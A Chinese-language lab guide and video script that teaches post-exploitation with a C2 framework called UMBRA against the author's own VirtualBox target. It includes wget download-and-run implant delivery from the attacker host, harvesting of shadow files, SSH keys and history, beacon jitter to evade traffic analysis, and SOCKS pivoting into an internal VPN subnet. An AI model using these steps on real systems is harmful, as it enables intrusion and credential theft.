## 二、初始访问：实测结果与可行方案

### 2.1 实测结论：三条远程路径全部不可用

| 路径 | 结论 | 判据 |
|---|---|---|
| Drupalgeddon（SA-CORE-2014-005） | ❌ 已修补 | `1=1` 与 `1=2` 响应完全一致；6 种报错载荷无 SQL 文本；`sleep(5)` 仅 0.03s |
| Drupalgeddon2（CVE-2018-7600） | ❌ 已修补 | 5 种载荷全部返回完整 HTML，而非 AJAX JSON |
| Coppermine 1.4.14 | ❌ 环境不兼容 | 所有 `.php` 入口 HTTP 500，PHP 7.3 跑不了 2007 年的 PHP 5 代码 |

**关键经验**：`CHANGELOG.txt` 说 7.20，但代码已打补丁——版本号是线索，不是结论。

> 详细实测记录见 [`exploits/README.md`](../exploits/README.md)

### 2.2 可行的初始访问方案

#### 方案 A · VirtualBox 控制台（推荐用于录教程）

这是**你自己的实验环境**，从虚拟机控制台以 root 登录完全正当。

```
1. VirtualBox 管理器 → 选中 webserver → 点「显示」
2. 控制台用 root 登录
3. 执行 exploits/lab-shell.sh 确认环境
4. 开始录制
```

**视频里怎么讲**：

> 「我们已经通过某种方式拿到了 root。本期不讨论怎么进来的，讨论进来之后怎么办——这才是 C2 框架要解决的问题。」

**优点**：稳定、可重复、把时间花在后渗透上。

#### 方案 B · 克隆靶机降级（要演示远程打点）

如果视频必须包含远程利用，**克隆一台新虚拟机**，别动现有的：

```bash
# 在新克隆里
# 把 Drupal 降到 7.31（未打 SA-CORE-2014-005）
# 或把 PHP 降到 5.6（让 Coppermine 能跑）
```

#### 方案 C · 已知凭据 SSH（最真实的演示）

```bash
ssh root@192.168.1.46
```

前提是你知道密码（自己设的）。

## 三、完整执行代码

### 3.1 侦察（Kali 侧）

```bash
# 完整侦察
bash exploits/recon.sh 192.168.1.46

# 指纹识别
python3 exploits/fingerprint.py http://192.168.1.46
```

`recon.sh` 会输出：开放端口、HTTP banner、PHP 版本、Drupal 版本、目录暴露、敏感文件。

### 3.2 漏洞验证（Kali 侧，只读）

```bash
# SQLi 检测
python3 exploits/drupalgeddon.py detect http://192.168.1.46

# SQL 错误特征检测（决定性判据）
python3 exploits/check-sql-errors.py http://192.168.1.46

# RCE 真伪验证（防误报）
python3 exploits/verify-rce.py http://192.168.1.46

# 5 种载荷变体
python3 exploits/cve-2018-7600-variants.py http://192.168.1.46

# Coppermine 入口探测
python3 exploits/check-coppermine.py http://192.168.1.46
```

### 3.3 靶机环境自检（webserver 内）

```bash
bash exploits/lab-shell.sh
```

输出：是否 root、Kali 是否可达、系统版本、Web 应用版本、网卡、VPN 接口。

### 3.4 后渗透采集（webserver 内，只读）

```bash
# 全部 8 个阶段
bash exploits/post-exploitation.sh all

# 或分阶段
bash exploits/post-exploitation.sh recon        # 信息收集
bash exploits/post-exploitation.sh creds        # 凭据收集
bash exploits/post-exploitation.sh pivot        # 横向准备
bash exploits/post-exploitation.sh persistence  # 持久化点检测
```

**8 个阶段**：

| 阶段 | 内容 | 关键产出 |
|---|---|---|
| 1 身份与系统 | id、内核、系统版本、容器检测 | 判断环境性质 |
| 2 网络与内网 | 网卡、路由、ARP、VPN 接口 | **发现内网网段** |
| 3 用户与权限 | passwd、UID 0 账号、SUID 文件 | 提权线索 |
| 4 凭据收集 | shadow、SSH 私钥、bash 历史、配置文件 | **横向钥匙** |
| 5 进程与服务 | 高占用进程、安全软件、VPN 进程、定时任务 | 识别对手 |
| 6 文件与数据 | 网站根目录、可写目录、备份文件 | 落地位置 |
| 7 横向准备 | 内网探测、ARP 主机、VPN 路由、工具可用性 | 攻击路径 |
| 8 持久化检测 | crontab、systemd 目录、bashrc 可写性 | 维持能力（只检测不安装） |

### 3.5 UMBRA 平台操作（Kali 侧）

```bash
# 1. 启动服务端
cd /home/myroot/umbra
setsid nohup ./umbra.py server start > /tmp/umbra-server.log 2>&1 < /dev/null &

# 2. 确认监听
ss -ltn | grep 9000
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:9000/   # 401 是好事

# 3. 启动客户端
export DISPLAY=:0
/home/myroot/umbra/client/gui/dist/umbra.AppImage \
  --appimage-extract-and-run --no-sandbox
```

**客户端内操作**：

```
连接服务器 : UMBRA → 服务器 → 添加 → 填 127.0.0.1:9000 + admin.key → 点「认证」
创建监听器 : Shift+L → 添加 → http → 服务器选 kali-lab → Port to Open: 8080
生成植入体 : Shift+I → Stageless → Linux/x64/elf → C2 填 192.168.1.50:8080
会话管理   : Alt+S   终端 Alt+T   文件 Alt+F   进程 Alt+R   凭据 Alt+K
横向代理   : Shift+N → socks → 1080
报告导出   : Shift+R
命令面板   : Ctrl+K
```

### 3.6 植入体投放（webserver 内）

```bash
# Kali 侧起临时 HTTP 服务
cd /tmp && python3 -m http.server 8000

# webserver 侧下载
cd /tmp
wget http://192.168.1.50:8000/implant -O implant
chmod +x implant
./implant &
```

### 3.7 横向移动（Kali 侧）

```bash
# UMBRA 里建好 SOCKS 代理后
curl --socks5 127.0.0.1:1080 http://10.8.0.1/

# proxychains 扫内网
proxychains nmap -sT -Pn 10.8.0.0/24
```

> 注意：SOCKS 不支持原始套接字，必须用 `-sT`（TCP connect）。

### 3.8 一键验证回连闭环（Kali 侧）

```bash
# 构建 ELF 植入体
bash scripts/kali-build-implant.sh

# 运行并等待会话上线
bash scripts/kali-callback-test.sh

# 清理测试痕迹
bash scripts/kali-cleanup-test.sh
```

**实测结果**：植入体 2 秒上线，会话信息完整。

#### 第一幕 · 场景与问题定义（00:00 – 06:00）

**00:00–01:30 · 开场**

画面：webserver 的 root shell，然后切到 UMBRA 主界面。

旁白：

> 假设你已经拿到了这台 webserver 的 root。很多人到这里觉得结束了。
>
> 但真正的活儿才刚开始。三个理由：
>
> **一、这个 shell 随时会断。** 网络抖动、目标重启、管理员发现，任何一件事都让你前功尽弃。
>
> **二、你只有一个终端。** 想看文件、看进程、抓凭据，只能来回切命令。
>
> **三、你没法横向。** 这台机器只是入口，真正的目标在它后面的内网。
>
> 这期视频讲：**怎么用一个 root shell，撬动整个内网。**

**01:30–03:30 · 靶机侦察回顾（放实测数据）**

画面：`bash exploits/recon.sh 192.168.1.46` 的实际输出。

旁白：

> 先看这台机器暴露了什么。
>
> - Apache 2.4.20，PHP 7.3.19
> - Drupal 7.20，Coppermine 1.4.14
> - 21 个开放端口
> - 目录列表全开
>
> 最关键的线索在这里——`debugvpn.txt`：

画面：`debugvpn.txt` 内容。

> ```
> openvpn --client --remote vpnserver01 --auth-user-pass login.conf ...
> ```
>
> **这是一份 VPN 配置。** 说明这台机器连着内网 VPN。
>
> 换句话说：**它是通往内网的跳板。**

**03:30–05:00 · 一个诚实的技术点（教学价值高）**

旁白：

> 这里必须说一个真话。
>
> Drupal 7.20 按公开资料有 Drupalgeddon 和 Drupalgeddon2 两个著名漏洞。我实际测了——**都打不动**。
>
> 为什么？看实测：

画面：检测输出。

> ```
> 1=1 和 1=2 响应完全一致（14605 字节）
> 6 种报错载荷没有任何 SQL 错误文本
> sleep(5) 只用了 0.03 秒
> ```
>
> 三条同时不成立，说明注入点不存在。
>
> 再看 RCE：5 种载荷全部返回完整 HTML 页面，而不是 Drupal AJAX 的 JSON。
>
> **这就是重点：`CHANGELOG.txt` 说 7.20，但代码已经打补丁了。版本号是线索，不是结论。**
>
> 顺便讲个我踩的坑：我第一版检测脚本报了「存在 RCE」，因为响应里出现了我发的标记。**这是误报**——Drupal 会把表单值原样回显。后来我改用「输出 ≠ 输入」的判据：发 `expr 6 \* 7`，看响应里有没有 `42`，而不是有没有命令文本。

**05:00–06:00 · 为什么需要 C2 框架**

| 能力 | 裸 shell | UMBRA |
|---|---|---|
| 连接稳定性 | 断了就没了 | 心跳保活 |
| 多任务 | 一个终端 | 多面板并行 |
| 文件管理 | 手打 base64 | 图形化 |
| 凭据管理 | 记记事本 | 集中存储 |
| 横向移动 | 手动配代理 | 一键 SOCKS |
| 证据留存 | 自己截图 | 自动记录 |

> **裸 shell 是「进去了」，C2 框架是「站稳了、看清了、打下去了」。**

#### 第二幕 · 部署作战平台（06:00 – 14:00）

**06:00–08:00 · 启动服务端**

```bash
cd /home/myroot/umbra
./umbra.py server start
```

> 服务端是中枢：接植入体回连、存数据、给客户端提供 API。
>
> 监听 `0.0.0.0:9000`，所有网卡。

验证：

```bash
ss -ltn | grep 9000          # LISTEN 0.0.0.0:9000
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:9000/   # 401
```

> **401 是好事**，说明认证中间件在工作。返回 200 反而说明认证没生效。

**08:00–10:00 · 启动客户端**

```bash
export DISPLAY=:0
/home/myroot/umbra/client/gui/dist/umbra.AppImage \
  --appimage-extract-and-run --no-sandbox
```

> 两个参数：
> - `--appimage-extract-and-run` —— Kali 只有 libfuse3，AppImage 需要 libfuse2
> - `--no-sandbox` —— root 运行时 Chromium 沙箱冲突

画面：切中英文、切 4 套主题。

**10:00–14:00 · 连接服务器（易错点）**

UMBRA → 服务器 → 添加：

| 字段 | 值 |
|---|---|
| 名称 | `kali-lab` |
| 协议 | `http` |
| 主机 | `127.0.0.1` |
| 端口 | `9000` |
| 密钥 | `admin.key` 整行 |

**必须点「认证」**：

> 服务器配置**只在认证成功后写入** `config.json`。只填表单不点认证 = 什么都没保存。后面建监听器时下拉框会是空的，看起来像「点不动」。

验证：

```bash
cat ~/.config/umbra/config.json   # servers 数组有内容，带 token
```

#### 第三幕 · 建立持久访问（14:00 – 24:00）

**14:00–16:00 · 创建监听器**

`Shift+L` → 添加：

| 字段 | 值 |
|---|---|
| 名称 | `http-8080` |
| 类型 | `Channel` |
| 通道 | `http` |
| 服务器 | `kali-lab` |
| Port to Open | `8080` |

验证：

```bash
ss -ltn | grep 8080     # LISTEN 0.0.0.0:8080
```

**重点讲绑定地址**：

> 注意是 `0.0.0.0:8080`，不是 `127.0.0.1`。
>
> - `0.0.0.0` —— 所有网卡，远程能连
> - `127.0.0.1` —— 只有本机，远程永远连不上
>
> 我实测踩过这个坑：服务器下拉框的 IP 被错误写进了绑定地址，监听器只绑在 `127.0.0.1`。表面「创建成功」，植入体永远回连不上。
>
> **「监听成功」和「能被远程访问」是两件事。**

**16:00–20:00 · 生成植入体**

`Shift+I` → Stageless：

| 字段 | 值 |
|---|---|
| 编译服务器 | `127.0.0.1:9000` |
| 操作系统 | `Linux` |
| 架构 | `x64` |
| 格式 | `elf` |
| 通道 | `http` |
| **Server 地址** | **`192.168.1.50:8080`** |
| 延迟 | `5` |
| 抖动 | `20` |

**C2 地址怎么判断**：

> 唯一标准：**从目标机能不能访问到这个地址？**
>
> - Kali 桥接（`192.168.1.50`）→ 直接填 Kali IP
> - Kali NAT（`10.0.2.15`）→ 填宿主机 IP + 端口转发
>
> 验证：在目标机 `curl http://192.168.1.50:8080`

**延迟与抖动**：

> 如果每 5 秒精确回连，流量分析一眼看出异常。加 20% 抖动，间隔变成 4–6 秒随机：
> ```
> 实际间隔 = delay × (1 ± jitter/100)
> ```

**20:00–24:00 · 投放与上线**

```bash
# Kali 起临时服务
cd /tmp && python3 -m http.server 8000

# webserver 下载执行
cd /tmp
wget http://192.168.1.50:8000/implant -O implant
chmod +x implant
./implant &
```

客户端 `Alt+S`：

> 会话上线了。**实测 2 秒上线。**
>
> 看信息：主机名、用户、系统、架构、内网 IP、权限。
>
> **现在我们有了稳定的、可管理的、带图形界面的通道。**

排错流程（字幕）：

```
① 目标能 curl 通 C2 地址吗？   → 不通 = 网络问题
② Kali 上 8080 在监听吗？      → ss -ltn | grep 8080
③ 绑的是 0.0.0.0 吗？          → 不是就重建
④ 植入体在跑吗？               → ps aux | grep implant
⑤ 防火墙拦了吗？               → iptables -L
⑥ 看服务端日志                 → tail -f /tmp/umbra-server.log
```

**30:00–32:00 · 进程管理（关键发现）**

`Alt+R`：

| 进程 | 含义 |
|---|---|
| `mysqld` | 数据库 |
| `apache2` | Web 服务 |
| **`openvpn`** | **VPN 客户端** |
| `osqueryd` / `auditd` | 安全监控 |

> 注意 `openvpn`。结合 `debugvpn.txt`，说明这台机器**已连上内网 VPN**。
>
> 查看接口：

```bash
ip -4 addr show tun0
# inet 10.8.0.6/24
```

> **发现全新网段 `10.8.0.0/24`。** 之前完全不知道它存在。
>
> 三条信息串起来：`debugvpn.txt` → `openvpn` 进程 → `tun0` 接口 → 内网入口。
>
> **这就是信息关联能力。**

**32:00–34:00 · 凭据收集**

`Alt+K`：

| 用户名 | 凭据 | 来源 |
|---|---|---|
| `drupal_user` | 数据库密码 | `settings.php` |
| `root` | 哈希 | `/etc/shadow` |
| `admin` | 明文 | `.bash_history` |

> 每条记录来源，方便回溯。
>
> **凭据复用是横向移动的核心。**

#### 第六幕 · 横向移动（43:00 – 49:00）★重点

**43:00–47:00 · SOCKS 代理**

`Shift+N` → 添加：

| 字段 | 值 |
|---|---|
| 类型 | `socks` |
| 监听端口 | `1080` |
| 目标主机 | `192.168.1.46` |

> 现在我们有了一台连着 VPN 的 root 机器，能看到 `10.8.0.0/24`，但 Kali 直接访问不到。
>
> **把 webserver 变成代理跳板。**

验证：

```bash
ss -ltn | grep 1080
curl --socks5 127.0.0.1:1080 http://10.8.0.1/
```

**47:00–49:00 · 扫描内网**

```bash
proxychains nmap -sT -Pn 10.8.0.0/24
```

> 注意必须用 `-sT`（TCP connect），SOCKS 不支持原始套接字。
>
> **这就是「以点破面」—— 攻破一台，拿下整个内网。**

### 5.1 六个原创优势

| 优势 | 说明 |
|---|---|
| **完全双语** | 中英文实时切换，不用重启，选择持久化 |

| **作战仪表盘** | 会话数、监听器数、服务器数、高权限占比、系统分布 |

### 5.2 对比裸 shell

| 能力 | 裸 shell | UMBRA |
|---|---|---|
| 连接稳定性 | 断了就没了 | 心跳保活 + 抖动 |
| 多任务 | 一个终端 | 14 个功能面板并行 |
| 文件管理 | 手打 base64 | 图形化上传下载 |
| 凭据管理 | 记事本 | 集中存储 + 来源记录 |

| 自动化 | 手写脚本 | Nuke 脚本引擎 |
| AI 辅助 | 无 | DeepSeek / 自定义 LLM |

### 5.3 架构带来的实际好处

三层架构（客户端 / 服务端 / 植入体），**客户端与植入体永不直连**：

1. **客户端可随时关机** —— 植入体依然在线，数据不丢
2. **植入体被逆向也拿不到操作员信息** —— 只知道服务端地址
3. **多操作员协作** —— 服务端统一协调
4. **无状态认证** —— JWT，服务端重启不影响客户端

### 第四层 · 思维方式（最重要）

**① 从「点」到「面」**
拿到一台不是终点，是起点。要问：这台机器能带我去哪？

**② 信息关联**
`debugvpn.txt` → `openvpn` 进程 → `tun0` 接口 → `10.8.0.0/24`。
单独看都没什么，串起来就是内网入口。

**③ 决定性验证**
不满足于「字符串出现了」。用「输出 ≠ 输入」的判据（`expr 6 \* 7` → 看有没有 `42`）。

**④ 排错方法论**
会话不上线，按「网络 → 端口 → 绑定地址 → 载荷」顺序查。不瞎试。

**⑤ 工程健壮性**
从安装脚本的 t64 兼容、tmpfs 重定向，理解真实环境的复杂性。

**⑥ 合规意识**
明确授权边界，什么绝对不能做。
